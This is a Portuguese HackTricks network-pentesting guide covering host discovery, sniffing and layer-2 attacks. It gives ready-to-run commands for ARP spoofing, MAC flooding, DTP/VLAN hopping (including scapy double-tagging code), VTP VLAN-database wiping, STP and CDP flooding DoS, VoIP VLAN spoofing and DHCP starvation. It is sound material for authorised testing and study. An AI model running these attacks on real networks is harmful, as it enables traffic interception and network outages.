# Pentesting de Rede

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descobrindo hosts de fora

Esta será uma **breve seção** sobre como encontrar **IPs que respondem** da **Internet**.\
Nesta situação, você tem algum **escopo de IPs** (talvez até vários **intervalos**) e só precisa encontrar **quais IPs estão respondendo**.

### ICMP

Esta é a maneira **mais fácil** e **rápida** de descobrir se um host está ativo ou não.\
Você pode tentar enviar alguns pacotes **ICMP** e **esperar respostas**. A maneira mais fácil é apenas enviar uma **solicitação de eco** e esperar pela resposta. Você pode fazer isso usando um simples `ping` ou usando `fping` para **intervalos**.\
Você também pode usar o **nmap** para enviar outros tipos de pacotes ICMP (isso evitará filtros para solicitação-resposta de eco ICMP comum).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de Portas TCP

É muito comum encontrar que todos os tipos de pacotes ICMP estão sendo filtrados. Então, tudo o que você pode fazer para verificar se um host está ativo é **tentar encontrar portas abertas**. Cada host tem **65535 portas**, então, se você tem um escopo "grande", **não pode** testar se **cada porta** de cada host está aberta ou não, isso levará muito tempo.\
Então, o que você precisa é de um **scanner de portas rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **portas mais usadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Você também pode realizar esta etapa com o `nmap`, mas é mais lento e o `nmap` tem problemas para identificar hosts ativos.

### Descoberta de Porta HTTP

Esta é apenas uma descoberta de porta TCP útil quando você deseja **focar na descoberta de serviços HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descoberta de Porta UDP

Você também pode tentar verificar se há alguma **porta UDP aberta** para decidir se deve **prestar mais atenção** a um **host**. Como os serviços UDP geralmente **não respondem** com **nenhum dado** a um pacote de sonda UDP vazio regular, é difícil dizer se uma porta está sendo filtrada ou aberta. A maneira mais fácil de decidir isso é enviar um pacote relacionado ao serviço em execução e, como você não sabe qual serviço está em execução, deve tentar o mais provável com base no número da porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha nmap proposta anteriormente testará as **1000 portas UDP principais** em cada host dentro do intervalo **/24**, mas mesmo isso levará **>20min**. Se precisar de **resultados mais rápidos**, você pode usar o [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Isso enviará essas **sondas UDP** para suas **portas esperadas** (para um intervalo /24, isso levará apenas 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de Porta SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui você pode encontrar um guia completo de todos os ataques Wifi conhecidos no momento da escrita:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descobrindo hosts de dentro

Se você estiver dentro da rede, uma das primeiras coisas que você vai querer fazer é **descobrir outros hosts**. Dependendo de **quanto barulho** você pode/quer fazer, diferentes ações podem ser realizadas:

### Passivo

Você pode usar essas ferramentas para descobrir hosts passivamente dentro de uma rede conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Observe que as técnicas comentadas em [_**Descobrindo hosts de fora**_](./#discovering-hosts-from-the-outside) (_Descoberta de portas TCP/HTTP/UDP/SCTP_) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Ativo

Observe que as técnicas comentadas em _Descobrindo hosts de fora_ ([_**ICMP**_](./#icmp)) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:

* Se você **pingar** um **endereço de broadcast de sub-rede**, o ping deve chegar a **cada host** e eles podem **responder** a **você**: `ping -b 10.10.5.255`
* Pingando o **endereço de broadcast de rede**, você pode até encontrar hosts dentro de **outras sub-redes**: `ping -b 255.255.255.255`
* Use a opção `-PEPM` do `nmap` para realizar a descoberta de hosts enviando **solicitações ICMPv4 echo**, **timestamp** e **máscara de sub-rede**: `nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan é usado para **ligar** computadores através de uma **mensagem de rede**. O pacote mágico usado para ligar o computador é apenas um pacote onde um **MAC Dst** é fornecido e então ele é **repetido 16 vezes** dentro do mesmo pacote.\
Então, esse tipo de pacote é geralmente enviado em um **ethernet 0x0842** ou em um **pacote UDP para a porta 9**.\
Se **nenhum \[MAC]** for fornecido, o pacote é enviado para o **broadcast ethernet** (e o MAC de broadcast será o que será repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneando Hosts

Depois de descobrir todos os IPs (externos ou internos) que você deseja escanear em profundidade, diferentes ações podem ser realizadas.

### TCP

* **Porta aberta**: _SYN --> SYN/ACK --> RST_
* **Porta fechada**: _SYN --> RST/ACK_
* **Porta filtrada**: _SYN --> \[SEM RESPOSTA]_
* **Porta filtrada**: _SYN --> mensagem ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 opções para escanear uma porta UDP:

* Enviar um **pacote UDP** e verificar a resposta _**ICMP unreachable**_ se a porta estiver **fechada** (em vários casos, o ICMP será **filtrado** e você não receberá nenhuma informação se a porta estiver aberta ou fechada).
* Enviar um **datagrama formatado** para obter uma resposta de um **serviço** (por exemplo, DNS, DHCP, TFTP e outros, conforme listado em _nmap-payloads_). Se você receber uma **resposta**, então a porta está **aberta**.

O **Nmap** irá **misturar ambos** as opções usando "-sV" (os escaneamentos UDP são muito lentos), mas observe que os escaneamentos UDP são mais lentos do que os escaneamentos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Varredura SCTP

SCTP fica ao lado do TCP e UDP. Destinado a fornecer **transporte** de dados de **telefonia** sobre **IP**, o protocolo duplica muitos dos recursos de confiabilidade do Sistema de Sinalização 7 (SS7) e sustenta uma família de protocolos maior conhecida como SIGTRAN. SCTP é suportado por sistemas operacionais, incluindo IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS e VxWorks.

Duas varreduras diferentes para SCTP são oferecidas pelo nmap: _-sY_ e _-sZ_.
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasão de IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### Mais opções do nmap

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelando endereços IP internos

Roteadores, firewalls e dispositivos de rede mal configurados às vezes **respondem** a sondagens de rede **usando endereços de origem não públicos**. Você pode usar o _tcpdump_ para **identificar pacotes** recebidos de **endereços privados** durante os testes. Nesse caso, a interface _eth2_ no Kali Linux é **endereçável** a partir da **Internet pública** (se você estiver **atrás** de um **NAT** ou de um **firewall**, esse tipo de pacote provavelmente será **filtrado**).
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Ao fazer sniffing, você pode aprender detalhes sobre intervalos de IP, tamanhos de sub-rede, endereços MAC e nomes de host revisando quadros e pacotes capturados. Se a rede estiver mal configurada ou o tecido de comutação estiver sob estresse, os atacantes podem capturar material sensível por meio de sniffing passivo de rede.

Se uma rede Ethernet comutada estiver configurada corretamente, você só verá quadros de transmissão e material destinado ao seu endereço MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Também é possível capturar pacotes de uma máquina remota por meio de uma sessão SSH com o Wireshark como interface gráfica em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap é um framework de segurança de rede que permite a captura de pacotes, a manipulação de tráfego de rede, a injeção de pacotes maliciosos e a realização de ataques MITM (Man-in-the-Middle). Ele é uma ferramenta poderosa para testes de penetração em redes e pode ser usado para detectar vulnerabilidades em dispositivos conectados a uma rede. O Bettercap é compatível com várias interfaces de rede e pode ser executado em sistemas operacionais Windows, Linux e macOS.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Você pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analisar credenciais de um arquivo pcap ou de uma interface ao vivo.

## Ataques LAN

### ARP spoofing

O ARP Spoofing consiste em enviar respostas ARP gratuitas para indicar que o IP de uma máquina tem o MAC do nosso dispositivo. Em seguida, a vítima mudará a tabela ARP e entrará em contato com nossa máquina sempre que quiser entrar em contato com o IP falsificado.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof é uma ferramenta que permite interceptar o tráfego de rede entre dois dispositivos, redirecionando-o através do atacante. Isso é possível porque o protocolo ARP (Address Resolution Protocol) usado para associar endereços IP a endereços MAC em uma rede local é vulnerável a ataques de spoofing. Com o arpspoof, o atacante pode interceptar o tráfego de rede e realizar ataques de MITM (Man-in-the-Middle).
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Sobrecarga de CAM

Sobrecarregue a tabela CAM do switch enviando muitos pacotes com diferentes endereços MAC de origem. Quando a tabela CAM estiver cheia, o switch começará a se comportar como um hub (transmitindo todo o tráfego).
```bash
macof -i <interface>
```
Em switches modernos, essa vulnerabilidade foi corrigida.

### Ataques 802.1Q VLAN / DTP

#### Troncos Dinâmicos

**DTP (Dynamic Trunking Protocol)** é um protocolo de camada de link projetado para fornecer um sistema de troncos automático. Com o DTP, os switches decidem qual porta funcionará no modo trunk (Tronco) e qual não funcionará. O uso do **DTP** indica **má concepção de rede.** **Os troncos devem ser estritamente** onde são necessários e devem ser documentados.

**Por padrão, todas as portas do switch operam no modo Dynamic Auto.** Isso indica que a porta do switch está no modo de iniciação de tronco do switch vizinho. **O Pentester precisa se conectar fisicamente ao switch e enviar um quadro DTP Desirable**, que aciona a porta para mudar para o modo trunk. O atacante pode então enumerar VLANs usando análise de quadros STP e contornar a segmentação de VLAN criando interfaces virtuais.

Muitos switches suportam o Protocolo de Tronco Dinâmico (DTP) por padrão, no entanto, o que um adversário pode abusar para **emular um switch e receber tráfego em todas as VLANs**. A ferramenta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) pode farejar uma interface e **relatar se o switch está no modo padrão, trunk, dinâmico, automático ou de acesso** (este é o único que evitaria o VLAN hopping). A ferramenta indicará se o switch é vulnerável ou não.

Se for descoberto que a rede é vulnerável, você pode usar o _**Yersinia**_ para lançar um "**enable trunking**" usando o protocolo "**DTP**" e você poderá ver pacotes de rede de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
Para enumerar as VLANs, também é possível gerar o quadro DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Não interrompa o script sob nenhuma circunstância. Ele injeta DTP Desirable a cada três segundos. **Os canais de trunk criados dinamicamente no switch só duram cinco minutos. Após cinco minutos, o trunk cai.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de salientar que **Access/Desirable (0x03)** indica que o quadro DTP é do tipo Desirable, que informa a porta para mudar para o modo Trunk. E **802.1Q/802.1Q (0xa5)** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os quadros STP, **descobrimos a existência das VLANs 30 e 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Uma vez que você conhece os valores de IDs e IPs das VLANs, você pode **configurar uma interface virtual para atacar uma VLAN específica**.\
Se o DHCP não estiver disponível, use o _ifconfig_ para definir um endereço IP estático.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador VLAN Automático

O ataque discutido de **Dynamic Trunking e criação de interfaces virtuais e descoberta de hosts dentro** de outras VLANs é **realizado automaticamente** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dupla Marcação

Se um atacante conhece o valor do **MAC, IP e ID da VLAN do host da vítima**, ele pode tentar **marcar um quadro com duas VLANs** com a VLAN designada e a VLAN da vítima e enviar um pacote. Como a **vítima não poderá se conectar de volta** com o atacante, a **melhor opção para o atacante é se comunicar via UDP** para protocolos que possam executar algumas ações interessantes (como SNMP).

Outra opção para o atacante é lançar uma **varredura de porta TCP falsificando um IP controlado pelo atacante e acessível pela vítima** (provavelmente através da internet). Em seguida, o atacante poderia farejar no segundo host de sua propriedade se ele recebe alguns pacotes da vítima.

![](<../../.gitbook/assets/image (635) (1).png>)

Para realizar este ataque, você pode usar o scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentação Lateral de VLAN <a href="#d679" id="d679"></a>

Se você tem **acesso a um switch ao qual está conectado diretamente**, você tem a capacidade de **burlar a segmentação de VLAN** dentro da rede. Simplesmente **altere a porta para o modo trunk** (também conhecido como trunk), crie interfaces virtuais com os IDs das VLANs de destino e configure um endereço IP. Você pode tentar solicitar o endereço dinamicamente (DHCP) ou pode configurá-lo estaticamente. Depende do caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Camada 3

Em redes sem fio de convidados e outros ambientes, as configurações de VLAN privada (também conhecida como _isolamento de porta_) são usadas para **impedir que os pares interajam** (ou seja, os clientes **se conectam a um ponto de acesso sem fio, mas não podem se comunicar entre si**). Dependendo das ACLs de rede (ou da falta delas), pode ser possível enviar pacotes IP para um roteador, que são então encaminhados de volta para um par vizinho.

Este ataque enviará um **pacote especialmente criado para o IP de um cliente, mas com o MAC do roteador**. Então, o **roteador redirecionará o pacote para o cliente**. Como em _Ataques de Dupla Marcação_, você pode explorar essa vulnerabilidade controlando um host acessível pela vítima.

### Ataques VTP

**VTP (Protocolo de Tronco de VLAN)** é um protocolo projetado para gerenciar centralmente VLANs. Para acompanhar o banco de dados atual de VLANs, os switches verificam números de revisão especiais. Quando ocorre qualquer atualização da tabela, o número de revisão é incrementado em um. E se um switch detectar uma configuração com um número de revisão mais alto, ele atualizará automaticamente seu banco de dados de VLANs.

#### Funções em um domínio VTP <a href="#ebfc" id="ebfc"></a>

* **Servidor VTP.** Um switch no papel de Servidor VTP pode criar novas VLANs, excluir antigas ou alterar informações nas próprias VLANs. **Ele também gera anúncios VTP para os demais membros do domínio.**
* **Cliente VTP.** Um switch nesse papel receberá anúncios VTP específicos de outros switches no domínio para atualizar os bancos de dados de VLANs em seu próprio switch. Os clientes são limitados em sua capacidade de criar VLANs e nem mesmo são permitidos a alterar a configuração de VLAN localmente. Em outras palavras, **acesso somente leitura.**
* **Transparente VTP.** Nesse modo, o switch não participa dos processos VTP e pode hospedar a administração completa e local de toda a configuração de VLAN. Quando operando em modo transparente, os switches apenas transmitem anúncios VTP de outros switches sem afetar sua configuração de VLAN. **Tais switches sempre terão um número de revisão zero e não podem ser atacados.**

#### Tipos de anúncios <a href="#b384" id="b384"></a>

* **Anúncio de Resumo —** o anúncio VTP que o servidor VTP envia a cada **300 segundos (5 minutos).** Este anúncio armazena o nome do domínio VTP, a versão do protocolo, o carimbo de data/hora e o valor de hash de configuração MD5.
* **Anúncio de Subconjunto —** este é o anúncio VTP que é enviado sempre que ocorre uma alteração na configuração da VLAN.
* **Solicitação de Anúncio —** é uma solicitação do cliente VTP ao servidor VTP para uma mensagem de Anúncio de Resumo. Geralmente enviada em resposta a uma mensagem que um switch detectou um Anúncio de Resumo com um número de revisão de configuração mais alto.

O VTP pode ser **atacado apenas de uma porta de tronco**, porque **os anúncios VTP são apenas transmitidos e recebidos em portas de tronco.** **Portanto, ao fazer pentesting após atacar o DTP, seu próximo alvo pode ser o VTP.** Para atacar o domínio VTP, você pode **usar o Yersinia** para **executar uma injeção VTP que apagará todo o banco de dados de VLANs** e, assim, paralisar a rede.

{% hint style="info" %}
O protocolo VTP tem **três versões**. Neste post, o ataque é contra a primeira versão, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Para apagar todo o banco de dados VLAN, selecione a opção **deletar todas as VLANs VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Ataques STP

**Se você não conseguir capturar quadros BPDU em suas interfaces, é improvável que você tenha sucesso em um ataque STP.**

#### **DoS BPDU STP**

Enviando muitos BPDUs TCP (Notificação de Mudança de Topologia) ou Conf (os BPDUs que são enviados quando a topologia é criada), os switches ficam sobrecarregados e param de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Quando um TCP é enviado, a tabela CAM dos switches será deletada em 15 segundos. Então, se você estiver enviando continuamente esse tipo de pacote, a tabela CAM será reiniciada continuamente (ou a cada 15 segundos) e quando ela for reiniciada, o switch se comportará como um hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Raiz STP**

O atacante simula o comportamento de um switch para se tornar a raiz STP da rede. Em seguida, mais dados passarão por ele. Isso é interessante quando você está conectado a dois switches diferentes.\
Isso é feito enviando pacotes CONF de BPDUs dizendo que o valor de **prioridade** é menor que a prioridade real do switch raiz atual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
Se o atacante estiver conectado a 2 switches, ele pode ser a raiz da nova árvore e todo o tráfego entre esses switches passará por ele (um ataque MITM será realizado).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

O Protocolo de Descoberta CISCO é o protocolo usado pelos dispositivos CISCO para se comunicarem, **descobrir quem está vivo** e quais recursos eles têm.

#### Coleta de Informações <a href="#0e0f" id="0e0f"></a>

**Por padrão, o CDP envia anúncios para todas as suas portas.** Mas e se um invasor se conectar a uma porta no mesmo switch? Usando um sniffer de rede, seja **Wireshark,** **tcpdump** ou **Yersinia**, ele poderia extrair **informações valiosas sobre o próprio dispositivo**, desde o modelo até a versão do Cisco IOS. Usando essas informações, ele será capaz de enumerar a mesma versão do Cisco IOS e encontrar a vulnerabilidade e, em seguida, explorá-la.

#### Ataque de inundação CDP <a href="#0d6a" id="0d6a"></a>

Você pode fazer um ataque DoS a um switch CISCO esgotando a memória do dispositivo simulando dispositivos CISCO reais.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
Selecione a opção **tabela de inundação CDP** e inicie o ataque. A CPU do switch será sobrecarregada, assim como a tabela de vizinhos CDP, resultando em "paralisia de rede". 

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Ataque de Impersonação CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Também é possível usar o [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instalá-lo com o pacote `scapy/contrib`.

### Ataques VoIP

Embora destinados ao uso pelos telefones Voice over Internet Protocol (VoIP) dos funcionários, os dispositivos modernos de VoIP estão cada vez mais integrados aos dispositivos IoT. Muitos funcionários agora podem desbloquear portas usando um número de telefone especial, controlar o termostato da sala...

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) imita o comportamento de um telefone VoIP em ambientes Cisco, Avaya, Nortel e Alcatel-Lucent. Ele descobre automaticamente o ID da VLAN correto para a rede de voz usando um dos protocolos de descoberta de dispositivo que suporta, como o Protocolo de Descoberta Cisco (CDP), o Protocolo de Configuração Dinâmica de Hosts (DHCP), o Protocolo de Descoberta de Endpoint de Mídia de Descoberta de Camada de Link (LLDP-MED) e 802.1Q ARP.

**VoIP Hopper** suporta **três** modos CDP. O modo **sniff** inspeciona os pacotes de rede e tenta localizar o ID da VLAN. Para usá-lo, defina o parâmetro **`-c`** como `0`. O modo **spoof** gera pacotes personalizados semelhantes aos que um dispositivo VoIP real transmitiria na rede corporativa. Para usá-lo, defina o parâmetro **`-c`** como **`1`**. O modo de spoof com um pacote pré-fabricado envia os mesmos pacotes que um telefone IP Cisco 7971G-GE. Para usá-lo, defina o parâmetro **`-c`** como **`2`**.

Usamos o último método porque é a abordagem mais rápida. O parâmetro **`-i`** especifica a **interface de rede** do atacante e o parâmetro **`-E`** especifica o **nome do dispositivo VOIP** que está sendo imitado. Escolhemos o nome SEP001EEEEEEEEE, que é compatível com o formato de nomeação da Cisco para telefones VoIP. O formato consiste na palavra "SEP" seguida de um endereço MAC. Em ambientes corporativos, você pode imitar um dispositivo VoIP existente olhando a etiqueta MAC na parte de trás do telefone; pressionando o botão Configurações e selecionando a opção Informações do modelo na tela de exibição do telefone; ou conectando o cabo Ethernet do dispositivo VoIP ao seu laptop e observando as solicitações CDP do dispositivo usando o Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Se a ferramenta for executada com sucesso, a rede **VLAN atribuirá um endereço IPv4 ao dispositivo do atacante**.

### Ataques DHCP

#### Enumeração
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Existem **dois tipos de DoS** que podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para usar todos os possíveis endereços IP**. Este ataque só funcionará se você puder ver as respostas do servidor DHCP e concluir o protocolo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Por exemplo, isso **não é possível em redes Wi-Fi**.

Outra maneira de realizar um DoS DHCP é enviar um **pacote DHCP-RELEASE usando como código de origem todos os IPs possíveis**. Então, o servidor pensará que todo mundo terminou de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma maneira mais automática de fazer isso é usando a ferramenta [DHCPing](https://github.com/kamorin/DHCPig).

